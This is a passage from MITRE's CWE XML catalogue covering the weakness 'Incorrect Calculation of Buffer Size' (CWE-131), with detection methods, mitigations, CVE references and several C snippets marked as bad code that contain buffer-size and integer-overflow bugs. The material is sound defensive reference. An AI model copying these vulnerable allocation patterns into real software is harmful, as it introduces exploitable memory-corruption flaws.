            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2009-10-29">Unchecked Array
						Indexing</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="131" Name="Incorrect Calculation of Buffer Size" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The software does not correctly calculate the size to be used
					when allocating a buffer, which could lead to a buffer
					overflow.</Description_Summary>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>865</Relationship_Target_ID>
               <!--2011 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>802</Relationship_Target_ID>
               <!--2010 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>682</Relationship_Target_ID>
               <!--Incorrect Calculation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>119</Relationship_Target_ID>
               <!--Improper Restriction of Operations within the Bounds of a Memory Buffer--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>742</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 08 - Memory Management (MEM)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>876</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 08 - Memory Management (MEM)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>974</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Incorrect Buffer Length Computation--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language Language_Name="C"/>
               <Language Language_Name="C++"/>
            </Languages>
         </Applicable_Platforms>
         <Maintenance_Notes>
            <Maintenance_Note>
               <Text>This is a broad category. Some examples include:</Text>
               <Block Block_Nature="Numeric_List">
                  <Text>simple math errors,</Text>
                  <Text>incorrectly updating parallel counters,</Text>
                  <Text>not accounting for size differences when "transforming" one input to
							another format (e.g. URL canonicalization or other transformation that
							can generate a result that's larger than the original input, i.e.
							"expansion").</Text>
               </Block>
               <Text>This level of detail is rarely available in public reports, so it is
						difficult to find good examples.</Text>
            </Maintenance_Note>
            <Maintenance_Note>
               <Text>This weakness may be a composite or a chain. It also may contain layering
						or perspective differences.</Text>
               <Text>This issue may be associated with many different types of incorrect
						calculations (CWE-682), although the integer overflow (CWE-190) is probably
						the most prevalent. This can be primary to resource consumption problems
						(CWE-400), including uncontrolled memory allocation (CWE-789). However, its
						relationship with out-of-bounds buffer access (CWE-119) must also be
						considered.</Text>
            </Maintenance_Note>
         </Maintenance_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>High to Very High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read memory</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Modify memory</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the incorrect calculation is used in the context of memory
							allocation, then the software may create a buffer that is smaller or
							larger than expected. If the allocated buffer is smaller than expected,
							this could lead to an out-of-bounds read or write (CWE-119), possibly
							causing a crash, allowing arbitrary code execution, or exposing
							sensitive data.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can often be detected using automated static analysis
							tools. Many modern tools use data flow analysis or constraint-based
							techniques to minimize the number of false positives.</Text>
                  <Text>Automated static analysis generally does not account for environmental
							considerations when reporting potential errors in buffer calculations.
							This can make it difficult for users to determine which warnings should
							be investigated first. For example, an analysis tool might report buffer
							overflows that originate from command line arguments in a program that
							is not expected to run with setuid or other special privileges.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text>Detection techniques for buffer-related errors are more mature than
							for most other weakness types.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using dynamic tools and techniques that
							interact with the software using large test suites with many diverse
							inputs, such as fuzz testing (fuzzing), robustness testing, and fault
							injection. The software's operation may slow down, but it should not
							become unstable, crash, or generate incorrect results.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text>Without visibility into the code, black box methods may not be able to
							sufficiently distinguish this weakness from others, requiring follow-up
							manual methods to diagnose the underlying problem. </Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-9">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>Manual analysis can be useful for finding this weakness, but it might
							not achieve desired code coverage within limited time constraints. This
							becomes difficult for weaknesses that must be considered for all inputs,
							since the attack surface can be too large.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using tools and techniques that require
							manual (human) analysis, such as penetration testing, threat modeling,
							and interactive tools that allow the tester to record and modify an
							active session. </Text>
                  <Text>Specifically, manual static analysis is useful for evaluating the
							correctness of allocation calculations. This can be useful for detecting
							overflow conditions (CWE-190) or similar weaknesses that might have
							serious security impacts on the program.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Source Code Quality Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When allocating a buffer for the purpose of transforming, converting,
							or encoding an input, allocate enough memory to handle the largest
							possible encoding. For example, in a routine that converts "&amp;"
							characters to "&amp;amp;" for HTML entity encoding, the output
							buffer needs to be at least 5 times as large as the input buffer.
						</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-36">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Understand the programming language's underlying representation and
							how it interacts with numeric calculation (CWE-681). Pay close attention
							to byte size discrepancies, precision, signed/unsigned distinctions,
							truncation, conversion and casting between types, "not-a-number"
							calculations, and how the language handles numbers that are too large or
							too small for its underlying representation. [R.131.7]</Text>
                  <Text>Also be careful to account for 32-bit, 64-bit, and other potential
							differences that may affect the numeric representation.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-8">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Perform input validation on any numeric input by ensuring that it is
							within the expected range. Enforce that the input meets both the minimum
							and maximum requirements for the expected range.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When processing structured incoming data containing a size field
							followed by raw data, identify and resolve any inconsistencies between
							the size field and the actual size of the data (CWE-130).</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When allocating memory that uses sentinels to mark the end of a data
							structure - such as NUL bytes in strings - make sure you also include
							the sentinel in your calculation of the total amount of memory that must
							be allocated.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-13">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Replace unbounded copy functions with analogous functions that support
							length arguments, such as strcpy with strncpy. Create these if they are
							not available.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Moderate</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This approach is still susceptible to calculation errors, including
							issues such as off-by-one errors (CWE-193) and incorrectly calculating
							buffer lengths (CWE-131).</Text>
                  <Text>Additionally, this only addresses potential overflow issues. Resource
							consumption / exhaustion issues are still possible.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use sizeof() on the appropriate data type to avoid CWE-467.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use the appropriate type for the desired action. For example, in
							C/C++, only use unsigned types for values that could never be negative,
							such as height, width, or other numbers related to quantity. This will
							simplify sanity checks and will reduce surprises related to unexpected
							casting.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>Use libraries or frameworks that make it easier to handle numbers
							without unexpected consequences, or buffer allocation routines that
							automatically track buffer size.</Text>
                  <Text>Examples include safe integer handling packages such as SafeInt (C++)
							or IntegerLib (C or C++). [R.131.1]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-10">
               <Mitigation_Phase>Build and Compilation</Mitigation_Phase>
               <Mitigation_Strategy>Compilation or Build Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run or compile the software using features or extensions that
							automatically provide a protection mechanism that mitigates or
							eliminates buffer overflows.</Text>
                  <Text>For example, certain compilers and extensions provide automatic buffer
							overflow detection mechanisms that are built into the compiled code.
							Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat
							FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not necessarily a complete solution, since these mechanisms
							can only detect certain types of overflows. In addition, an attack could
							still cause a denial of service, since the typical response is to exit
							the application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-11">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run or compile the software using features or extensions that randomly
							arrange the positions of a program's executable and libraries in memory.
							Because this makes the addresses unpredictable, it can prevent an
							attacker from reliably jumping to exploitable code.</Text>
                  <Text>Examples include Address Space Layout Randomization (ASLR) [R.131.3]
							[R.131.5] and Position-Independent Executables (PIE) [R.131.10].</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not a complete solution. However, it forces the attacker to
							guess an unknown value that changes every program execution. In
							addition, an attack could still cause a denial of service, since the
							typical response is to exit the application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-12">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a CPU and operating system that offers Data Execution Protection
							(NX) or its equivalent [R.131.4] [R.131.5].</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not a complete solution, since buffer overflows could be used
							to overwrite nearby variables to modify the software's state in
							dangerous ways. In addition, it cannot be used in cases in which
							self-modifying code is required. Finally, an attack could still cause a
							denial of service, since the typical response is to exit the
							application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-26">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Compilation or Build Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Examine compiler warnings closely and eliminate problems with
							potential security implications, such as signed / unsigned mismatch in
							memory operations, or use of uninitialized variables. Even if the
							weakness is rarely exploitable, a single failure may lead to the
							compromise of the entire system.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.131.6]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by the software.</Text>
                  <Text>OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows the software
							to specify restrictions on file operations.</Text>
                  <Text>This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of the application may still be subject
							to compromise.</Text>
                  <Text>Be careful to avoid CWE-243 and other weaknesses related to jails.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-20">
               <Intro_Text>The following code allocates memory for a maximum number of widgets.
						It then gets a user-specified number of widgets, making sure that the user
						does not request too many. It then initializes the elements of the array
						using InitializeWidget(). Because the number of widgets can vary for each
						request, the code inserts a NULL pointer to signify the location of the last
						widget.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>int i;</Code>
                     <Code>unsigned int numWidgets;</Code>
                     <Code>Widget **WidgetList;</Code>
                     <Code/>
                     <Code>numWidgets = GetUntrustedSizeValue();</Code>
                     <Code>if ((numWidgets == 0) || (numWidgets &gt; MAX_NUM_WIDGETS))
								{</Code>
                     <Block>
                        <Code>ExitError("Incorrect number of widgets requested!");</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget
								*));</Code>
                     <Code>printf("WidgetList ptr=%p\n", WidgetList);</Code>
                     <Code>for(i=0; i&lt;numWidgets; i++) {</Code>
                     <Block>
                        <Code>WidgetList[i] = InitializeWidget();</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>WidgetList[numWidgets] = NULL;</Code>
                     <Code>showWidgets(WidgetList);</Code>
                  </Block>
                  <Text>However, this code contains an off-by-one calculation error. It
							allocates exactly enough space to contain the specified number of
							widgets, but it does not include the space for the NULL pointer. As a
							result, the allocated buffer is smaller than it is supposed to be. So if
							the user ever requests MAX_NUM_WIDGETS, there is an off-by-one buffer
							overflow (CWE-193) when the NULL is assigned. Depending on the
							environment and compilation settings, this could cause memory
							corruption.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-33">
               <Intro_Text>The following image processing code allocates a table for
						images.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>img_t table_ptr; /*struct containing img data, 10kB each*/</Code>
                     <Code>int num_imgs;</Code>
                     <Code>...</Code>
                     <Code>num_imgs = get_num_imgs();</Code>
                     <Code>table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>This code intends to allocate a table of size num_imgs, however as
							num_imgs grows large, the calculation determining the size of the list
							will eventually overflow (CWE-190). This will result in a very small
							list to be allocated instead. If the subsequent code operates on the
							list as if it were num_imgs long, it may result in many types of
							out-of-bounds problems (CWE-119).</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-19">
               <Intro_Text>This example applies an encoding procedure to an input string and
						stores it into a buffer.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>char * copy_input(char *user_supplied_string){</Code>
                     <Block Block_Nature="Bad_Code">
                        <Code>int i, dst_index;</Code>
                        <Code>char *dst_buf = (char*)malloc(4*sizeof(char) *
									MAX_SIZE);</Code>
                        <Code>if ( MAX_SIZE &lt;= strlen(user_supplied_string) ){</Code>
                        <Block>
                           <Code>die("user string too long, die evil hacker!");</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>dst_index = 0;</Code>
                        <Code>for ( i = 0; i &lt; strlen(user_supplied_string); i++
									){</Code>
                        <Block>
                           <Code>if( '&amp;' == user_supplied_string[i] ){</Code>
                           <Block>
                              <Code>dst_buf[dst_index++] = '&amp;';</Code>
                              <Code>dst_buf[dst_index++] = 'a';</Code>
                              <Code>dst_buf[dst_index++] = 'm';</Code>
                              <Code>dst_buf[dst_index++] = 'p';</Code>
                              <Code>dst_buf[dst_index++] = ';';</Code>
                           </Block>
                           <Code>}</Code>
                           <Code>else if ('&lt;' == user_supplied_string[i] ){</Code>
                           <Block>
                              <Comment>/* encode to &amp;lt; */</Comment>
                           </Block>
                           <Code>}</Code>
                           <Code>else dst_buf[dst_index++] =
										user_supplied_string[i];</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>return dst_buf;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The programmer attempts to encode the ampersand character in the
							user-controlled string, however the length of the string is validated
							before the encoding procedure is applied. Furthermore, the programmer
							assumes encoding expansion will only expand a given character by a
							factor of 4, while the encoding of the ampersand expands by 5. As a
							result, when the encoding procedure expands the string it is possible to
							overflow the destination buffer if the attacker provides a string of
							many ampersands.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-21">
               <Intro_Text>The following code is intended to read an incoming packet from a
						socket and extract one or more headers.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>DataPacket *packet;</Code>
                     <Code>int numHeaders;</Code>
                     <Code>PacketHeader *headers;</Code>
                     <Code/>
                     <Code>sock=AcceptSocketConnection();</Code>
                     <Code>ReadPacket(packet, sock);</Code>
                     <Code>numHeaders =packet-&gt;headers;</Code>
                     <Code/>
                     <Code>if (numHeaders &gt; 100) {</Code>
                     <Block>
                        <Code>ExitError("too many headers!");</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>headers = malloc(numHeaders * sizeof(PacketHeader);</Code>
                     <Code>ParsePacketHeaders(packet, headers);</Code>
                  </Block>
                  <Text> The code performs a check to make sure that the packet does not
							contain too many headers. However, numHeaders is defined as a signed
							int, so it could be negative. If the incoming packet specifies a value
							such as -3, then the malloc calculation will generate a negative number
							(say, -300 if each header can be a maximum of 100 bytes). When this
							result is provided to malloc(), it is first converted to a size_t type.
							This conversion then produces a large value such as 4294966996, which
							may cause malloc() to fail or to allocate an extremely large amount of
							memory (CWE-195). With the appropriate negative numbers, an attacker
							could trick malloc() into using a very small positive number, which then
							allocates a buffer that is much smaller than expected, potentially
							leading to a buffer overflow.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code attempts to save three different identification
						numbers into an array. The array is allocated from memory using a call to
						malloc(). </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>int *id_sequence;</Code>
                     <Code/>
                     <Comment>/* Allocate space for an array of three ids. */</Comment>
                     <Code/>
                     <Code>id_sequence = (int*) malloc(3);</Code>
                     <Code>if (id_sequence == NULL) exit(1);</Code>
                     <Code/>
                     <Comment>/* Populate the id array. */</Comment>
                     <Code/>
                     <Code>id_sequence[0] = 13579;</Code>
                     <Code>id_sequence[1] = 24680;</Code>
                     <Code>id_sequence[2] = 97531;</Code>
                  </Block>
                  <Text>The problem with the code above is the value of the size parameter
							used during the malloc() call. It uses a value of '3' which by
							definition results in a buffer of three bytes to be created. However the
							intention was to create a buffer that holds three ints, and in C, each
							int requires 4 bytes worth of memory, so an array of 12 bytes is needed,
							4 bytes for each int. Executing the above code could result in a buffer
							overflow as 12 bytes of data is being saved into 3 bytes worth of
							allocated space. The overflow would occur during the assignment of
							id_sequence[0] and would continue with the assignment of id_sequence[1]
							and id_sequence[2]. </Text>
                  <Text>The malloc() call could have used '3*sizeof(int)' as the value for the
							size parameter in order to allocate the correct amount of space required
							to store the three ints. </Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-1363</Observed_Example_Reference>
               <Observed_Example_Description>substitution overflow: buffer overflow using
						environment variables that are expanded after the length check is
						performed</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0747</Observed_Example_Reference>
               <Observed_Example_Description>substitution overflow: buffer overflow using
						expansion of environment variables</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2103</Observed_Example_Reference>
               <Observed_Example_Description>substitution overflow: buffer overflow using a
						large number of substitution strings</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-3120</Observed_Example_Reference>
               <Observed_Example_Description>transformation overflow: product adds extra escape
						characters to incoming data, but does not account for them in the buffer
						length</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2003-0899</Observed_Example_Reference>
               <Observed_Example_Description>transformation overflow: buffer overflow when
						expanding "&gt;" to "&amp;gt;", etc.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-0334</Observed_Example_Reference>
               <Observed_Example_Description>expansion overflow: buffer overflow using
						wildcards</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-0248</Observed_Example_Reference>
               <Observed_Example_Description>expansion overflow: long pathname + glob =
						overflow</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-0249</Observed_Example_Reference>
               <Observed_Example_Description>expansion overflow: long pathname + glob =
						overflow</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-0184</Observed_Example_Reference>
               <Observed_Example_Description>special characters in argument are not properly
						expanded</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0434</Observed_Example_Reference>
               <Observed_Example_Description>small length value leads to heap
						overflow</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
